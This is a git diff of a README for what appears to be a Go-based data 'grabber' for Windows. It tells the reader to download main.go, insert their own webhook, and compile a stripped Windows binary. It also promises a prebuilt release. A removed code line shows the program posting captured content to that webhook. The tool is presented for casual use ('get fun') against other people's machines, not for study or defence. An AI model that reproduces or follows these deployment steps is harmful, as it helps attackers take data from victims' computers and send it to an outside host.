@@ -9,15 +9,18 @@ But just for now...
 ## How do i use it?
 If you wanna get fun then you could follow those steps:
 - Well, you could just simply download main.go
-- Edit the file and replace ->THIS<-
+- Edit the file and replace THIS with your webhook
 
 ```
-_, err = http.PostForm("->THIS<-", url.Values{"content": {msg}})
+var(
+	webhook = "THIS"
+)
 ```
-by your webhook
-- then compile it using
+- then compile the gr4bber using
 ```
 GOOS=windows go build -ldflags="-s -w" main.go
 ```
+<b>There you go, get fun ;).</b>
 
-Or if you prefer, you could just 
+Or if you prefer, you could just download <a href="#">pre-build release</a> and get fun ;).
+<u>Coming Soon</u>
